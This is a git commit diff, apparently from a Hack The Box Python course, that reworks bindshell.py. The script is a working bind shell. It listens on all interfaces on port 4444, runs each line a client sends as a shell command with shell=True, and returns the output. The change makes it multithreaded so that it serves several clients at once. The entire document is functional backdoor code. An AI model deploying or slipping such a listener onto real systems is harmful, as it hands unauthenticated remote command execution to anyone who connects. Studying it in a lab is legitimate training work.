a640689635a0feba0a96e64d9197742c5922f4e0
jakfamily <fariajeanbap@gmail.com>
2023-12-31 14:21:02 +0100

    introduction python3 htb

--- bindshell.py
+++ bindshell.py
@@ -1,58 +1,40 @@
-import socket
-import subprocess
-import click
+import socket  # Importe le module socket pour la communication réseau
+import subprocess  # Importe le module subprocess pour exécuter des commandes système
+import click  # Importe le module click pour créer des interfaces en ligne de commande
+from threading import Thread  # Importe Thread du module threading pour le multithreading
 
-# Fonction pour exécuter une commande et renvoyer sa sortie
 def run_cmd(cmd):
     output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     return output.stdout
 
-# Options de ligne de commande avec Click pour spécifier le port
-@click.command()
-@click.option('--port', '-p', default=4444)
-def main(port):
-    # Créer un socket
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    # Lier le socket à une adresse et un port spécifiques
-    s.bind(('0.0.0.0', port))
-    
-    # Écouter les connexions entrantes, avec une file d'attente maximale de 4
-    s.listen(4)
-    
-    # Accepter une connexion d'un client
-    client_socket, address = s.accept()
-
-    # Recevoir et traiter continuellement les commandes du client
+def handle_input(client_socket):
     while True:
-        # Initialiser une liste vide pour stocker les morceaux de données reçus
         chunks = []
-        
-        # Recevoir le premier morceau de données (jusqu'à 2048 octets)
         chunk = client_socket.recv(2048)
-        
-        # Ajouter le morceau à la liste des morceaux
         chunks.append(chunk)
-        
-        # Continuer à recevoir des morceaux jusqu'à ce qu'un caractère de nouvelle ligne soit rencontré
         while len(chunk) != 0 and chr(chunk[-1]) != '\n':
             chunk = client_socket.recv(2048)
             chunks.append(chunk)
-        
-        # Combinez les morceaux reçus en une seule chaîne et supprimez le saut de ligne final
         cmd = (b''.join(chunks)).decode()[:-1]
 
-        # Vérifier si la commande reçue est 'exit'; si c'est le cas, fermer la connexion et sortir de la boucle
         if cmd.lower() == 'exit':
             client_socket.close()
             break
 
-        # Exécuter la commande reçue et obtenir la sortie
         output = run_cmd(cmd)
-        
-        # Envoyer la sortie de la commande de retour au client
         client_socket.sendall(output)
 
-# Exécuter la fonction principale si le script est exécuté directement
+@click.command()
+@click.option('--port', '-p', default=4444)
+def main(port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(('0.0.0.0', port))
+    s.listen(4)
+
+    while True:
+        client_socket, _ = s.accept()
+        t = Thread(target=handle_input, args=(client_socket, ))
+        t.start()
+
 if __name__ == '__main__':
     main()
